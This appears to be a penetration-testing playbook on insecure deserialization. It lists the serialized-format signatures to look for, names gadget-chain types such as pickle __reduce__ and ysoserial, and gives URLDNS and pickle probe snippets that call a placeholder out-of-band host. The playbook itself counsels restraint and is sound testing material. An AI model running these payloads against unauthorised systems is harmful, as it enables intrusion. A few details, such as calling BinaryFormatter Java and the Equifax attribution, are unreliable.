# Insecure deserialization — playbook

The class with the highest "you got RCE" rate per finding.

## when to try
- Endpoints accepting cookies/parameters/bodies that look serialized:
  - Java: `rO0AB...` (base64 of `\xac\xed\x00\x05` — Java serial header).
  - PHP: `O:6:"User":...`, `a:1:{...}`.
  - .NET: `AAEAAAD/////AQAAAAAAAAAM...` (BinaryFormatter base64), or `<ObjectStateFormatter>...</ObjectStateFormatter>`.
  - Python: `gASV...` (pickle base64) — mostly internal/admin tools.
  - Node: cookies signed with `cookie-signature` referencing `node-serialize` are rare today; YAML `js-yaml` < 4 with `Function` constructor.
  - Ruby/Rails: cookies (older Rails 5.x) using Marshal.

## bug archetypes
- **Pickle (Python)**: `__reduce__` → `os.system` on load. Trivial RCE if user-controlled.
- **Java**: ysoserial gadget chains (CommonsCollections, Spring, Hibernate, Groovy).
- **PHP**: POP chain leveraging `__destruct` / `__wakeup` magic methods.
- **.NET**: ysoserial.net for BinaryFormatter, LosFormatter, NetDataContract.
- **Ruby**: marshal_dump RCE on Rails secret-key cookies.
- **YAML**: `js-yaml` < 4 with default `LOAD` parses tagged Function.

## confirmation flow
1. Identify the serialization format from the magic bytes.
2. **Don't** auto-RCE on a real target. Instead:
   - Java: send a benign ysoserial `URLDNS` payload pointing at your OOB → DNS hit confirms gadget chain accepted.
   - Pickle: payload that does `socket.gethostbyname('YOURDNS.oob')` only.
3. Document the gadget chain and stop. Let the program triage.

## exploitation snippet
Java URLDNS probe:
```bash
java -jar ysoserial.jar URLDNS http://probe.oob > payload.bin
# attach as cookie or POST body, base64 if needed
base64 -w0 payload.bin > payload.b64
curl -sk -b "session=$(cat payload.b64)" https://t/
# Watch your DNS for probe.oob hit
```

Pickle probe (Python target):
```python
import pickle, base64
class P:
    def __reduce__(self):
        import socket; return (socket.gethostbyname, ('probe.oob',))
print(base64.b64encode(pickle.dumps(P())).decode())
```

## caveats
- Some apps put SIGNED-but-deserialized data (HMAC over the bytes) — confirm signature isn't enforced before celebrating.
- Java `BinaryFormatter` deprecated in .NET 8 but still present.
- ysoserial gadget availability depends on classpath — many modern apps strip Commons Collections.

## provenance
ysoserial / ysoserial.net. PortSwigger Deserialization labs.
Public: Equifax (Apache Struts CVE-2017-5638), VMware, multiple Java enterprise.
